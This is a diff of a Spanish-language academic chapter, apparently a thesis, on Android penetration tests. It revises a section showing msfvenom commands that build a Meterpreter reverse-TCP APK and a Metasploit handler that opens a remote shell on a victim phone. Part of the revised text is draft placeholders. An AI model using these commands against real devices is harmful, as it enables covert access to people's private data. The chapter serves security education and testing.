@@ -5,7 +5,8 @@ Pruebas en Android
 4.1 Objetivo
 
 El objetivo general del capítulo es explorar distintas pruebas prácticas que explotan vulnerabilidades para demostrar que existen riesgos en Android.
-Para cada prueba, se explica como se usan las herramientas, dando así una prueba de concepto (PoC). Una prueba de concepto (POC) es una demostración que tiene como objetivo verificar que ciertos conceptos o teorías son posibles aplicarlos en el mundo real para determinar su viabilidad [PROOFCO]. Se expone una gama de explotaciones de vulnerabilidades en dispositivos móviles, no sólo aquellas que afectan a Android exclusivamente, sino a otras plataformas, debido a que se va a tratar de dar un panorama amplio.
+Por cada prueba, se explica como se usan las herramientas, demostrando su potencial y factibilidad. Se expone una gama de explotaciones de vulnerabilidades en dispositivos móviles, no sólo aquellas que afectan a Android exclusivamente, sino a otras plataformas, debido a que algunas pruebas van mas allá del sistema operativo.
+{ ME BASO EN ESTE DOCUMENTO ... }
 
 4.2 Esquema general
 
@@ -20,7 +21,7 @@ A continuación, se enumerarán brevemente las pruebas principales.
 
 4.3 Medidas previas, entorno de trabajo y dispositivos.
 
-Se presentarán distintas pruebas que se realizan con la ayuda de herramientas. Pero antes de ejecutar las pruebas, es aconsejable tomar recaudos para no perder datos en el smartphone a utilizar.
+Se presentarán distintas pruebas que se realizan con ayuda de ciertas herramientas. Pero antes de ejecutar las pruebas, es aconsejable tomar recaudos para no perder datos en el smartphone a utilizar.
 En cuanto a los datos, se podría realizar una copia de resguardo (backup) de los archivos alojados en la tarjeta SD a otro medio. También se podría copiar los contactos del celular a la tarjeta SIM, como una forma de respaldar los contactos.
 En cuanto al entorno de pruebas, se utiliza el sistema operativo Kali Linux, dado que éste facilita algunas herramientas. Kali Linux es un Sistema Operativo que tiene como objetivo facilitar las auditorías y pruebas inherentes a la seguridad informática en general. Kali Linux tiene preinstalados más de 600 programas incluyendo Nmap (un escáner de puertos), Wireshark (un sniffer), John the Ripper (Un crackeador de passwords) y la suite Aircrack-ng (Software para pruebas de seguridad en redes inalámbricas); es un Sistema que trae herramientas que están documentadas, la mayoría son inherentes al software libre. Se usó este sistema operativo con la idea de facilitar las pruebas y tener a disposición un entorno cómodo para las mismas, dado que no se usó Kali Linux de forma amplia.
 Para la ejecución de las pruebas se utilizan 3 dispositivos: Motorola Defy+ (con Android 2.3.5), LG G3 (con Android 5.0.2) y Motorola Moto G (con Android 5.0.2).
@@ -31,21 +32,21 @@ Para la ejecución de las pruebas se utilizan 3 dispositivos: Motorola Defy+ (co
 
 4.4.1.1 Introducción
 
-La definición de pentesting es [PENTEST]:
-	"Una prueba de penetración (también llamado pentesting) es la práctica de probar un sistema de computadora, red o aplicación web para encontrar vulnerabilidades que un atacante puede explotar."
-Existen varias herramientas en el mercado para realizar este tipo de pruebas en el ámbito profesional, se eligió una que se llama "Metasploit". Ésta cuenta con la colaboración de la comunidad del software libre. Su subproyecto mas conocido se llama "Metasploit Framework", el cual es una aplicación para desarrollar y ejecutar exploits contra una máquina remota.
-En esta primer prueba, se tiene acceso a una herramienta profesional para comprobar la seguridad de Android, la prueba es sencilla y nos sirve para iniciar esta serie de pruebas. A grandes rasgos, el camino es el siguiente: el exploit se genera con una serie de comandos, que luego de alguna forma se transmite este instalador del exploit (con ingeniería social, por ejemplo) con la intención de que la víctima lo instale; una vez logrado ésto, el desarrollador del exploit tendrá acceso a cierta información del equipo de forma remota. Cabe aclarar que Kali Linux instala por defecto a Metasploit, con lo cual sólo se comentará acerca su uso, no su instalación.
+Primero se parte de la definición de pentesting [PENTEST]:
+	"Una prueba de penetración (también llamada pentesting) es la práctica de probar un sistema de computadora, red o aplicación web para encontrar vulnerabilidades que un atacante puede explotar."
+Para probar una vulnerabilidad en Android, se usó una herramienta para realizar una prueba de penetración, la misma se denomina "Metasploit", ésta cuenta con la colaboración de la comunidad del software libre; existen otras herramientas que también permiten realizar pruebas en Android, como por ejemplo "Android Tamer". Hay cuatro versiones de "Metasploit" [METAVER], la versión que se va a utilizar se llama "Metasploit Framework", es la más usada y la más activa entre las cuatro versiones. Esta versión es Open Source y gratuita, es utilizada principalmente por los desarrolladores de exploits y expertos en seguridad; esta versión expone una interfase por línea de comandos, pero tiene la funcionalidad básica en comparación con la versión paga más cara ("Metasploit Pro") [METAFRA]. Esta herramienta es instalada por defecto cuando se instala el sistema operativo Kali Linux, con lo cual sólo se describirá su uso, no su instalación; con algunos de sus comandos se podrá realizar la prueba.
+En esta primer prueba se pretende tener acceso a una herramienta profesional para comprobar la seguridad en Android, la prueba es sencilla y marca el inicio de la serie de demostraciones. A grandes rasgos, la serie de pasos que se sigue es la siguiente: primero se genera el exploit (con una serie de comandos), luego se transmite el exploit al smartphone de la víctima (con ingeniería social, por ejemplo), una vez que la víctima tiene incorporado el exploit, el autor de éste podrá acceder a cierta información privada contenida en el smartphone, de forma remota.
 
 4.4.1.2 Procedimiento
 
-La prueba consiste en la ejecución de algunos comandos por shell que generan el exploit (payload), con ésto se intenta realizar una prueba de penetración (pentesting) en Android. Para lograrlo, Metasploit dispone de una serie de comandos, que por un lado, nos va a guiar en el proceso de generación de un archivo que contiene un código malicioso (payload) y por el otro lado, nos va a ayudar en la ejecución del cliente que se va a conectar al dispositivo víctima cuando éste use el exploit. Con lo cual se pueden identificar 2 tareas: la generación del archivo (instalador del exploit) y la activación del cliente; estas tareas se van a ejecutar en 2 consolas distintas.
-El archivo que se genera lleva la extensión .apk (extensión usada para los instaladores de las aplicaciones de Android) el cual contiene un payload que nos va a permitir ingresar al sistema víctima y a partir de ahí podremos ejecutar una serie de comandos con privilegios altos en el cliente que está en espera, estos comandos pueden ser el acceso al filesystem por shell o el acceso al log de las llamadas hechas con el celular.
+Los pasos que se van a seguir se los pueden reunir en 2 grupos: la generación del exploit (en una PC) y la activación del exploit (en un smartphone); cada grupo de comandos se va a ejecutar en 2 consolas separadas. El primer grupo de comandos contribuyen en la generación de un archivo que contiene código malicioso (payload). El segundo grupo contribuyen en la ejecución del exploit en el smartphone víctima, que permite la conexión con la víctima cuando éste use el exploit.
+El archivo que se genera es un instalador de una aplicación Android (lleva la extensión .apk), el cual actúa como un exploit con el objetivo de ingresar al sistema víctima. Cuando se activa el exploit, se pueden ejecutar una serie de comandos para obtener información, como acceder al filesystem o acceder al log de llamadas hechas con el celular. Cuando se ejecuta el exploit desde el smartphone víctima, queda corriendo en segundo plano a la espera de órdenes de un host controlado por el atacante.
 
 CONSOLA 1
 El conjunto de comandos por consola (en modo superusuario) que se debe ejecutar es el siguiente:
 # ifconfig
-// Este comando retorna varios parámetros agrupados por interfase de red. En el grupo relativo a la conexión inalámbrica (wlan0), se obtiene la IP de la máquina actual (con el formato X.X.X.X) el cual nos sirve como parámetro para el siguiente comando
-# msfvenom -p android/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=8080 R > andro.apk
+// Este comando retorna varios parámetros agrupados por interfase de red. En el grupo relativo a la conexión inalámbrica (wlan0), se obtiene la IP de la máquina actual (con el formato X.X.X.X) el cual nos sirve como parámetro para el próximo comando:
+# msfvenom -p android/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=8080 R > exploit.apk
 
 CONSOLA 2
 // Seguidamente se abre otra consola y se ejecuta esta serie de comandos:
@@ -55,12 +56,14 @@ set payload android/meterpreter/reverse_tcp
 set lhost X.X.X.X
 set lport 8080
 exploit
-// Cuando se instale el exploit en el dispositivo víctima, se abrirá un shell de comandos para operar con el dispositivo:
+// Cuando se instale el exploit en el dispositivo víctima, automáticamente se abrirá un shell de comandos en esta consola, para operar con el dispositivo:
 meterpreter >
 
 4.4.1.3 Observaciones
 
-A partir de esta demostración, se puede concluir de forma parcial que se puede generar de forma fácil un exploit para obtener acceso a un máquina remota. Cabe aclarar que esta técnica se puede mejorar con la ayuda de la ingeniería social, de forma tal que se puede inducir a un usuario (víctima) a instalar el exploit en su celular para efectuar un acto criminal, entre otras cosas.
+Este comando funcionó para el modelo tal y tal, pero no para tal ---
+Cuando se activó el exploit y se ejecutaron comandos desde la PC, de forma remota, algunos de ellos no devolvían los resultados que se esperaban.
+En base a esta demostración, se obtuvieron las siguientes conclusiones. Se puede generar fácilmente un exploit que obtenga acceso (sin el consentimiento del usuario) a un smartphone. Por otro lado, esta técnica se puede mejorar con la ayuda de la ingeniería social, de forma tal que se puede inducir a un usuario (víctima) a instalar el exploit en su celular, para efectuar un acto criminal, por ejemplo. Finalmente, se aclara que esta prueba se aplica específicamente a Android.
 
 4.4.2 Segunda prueba
 
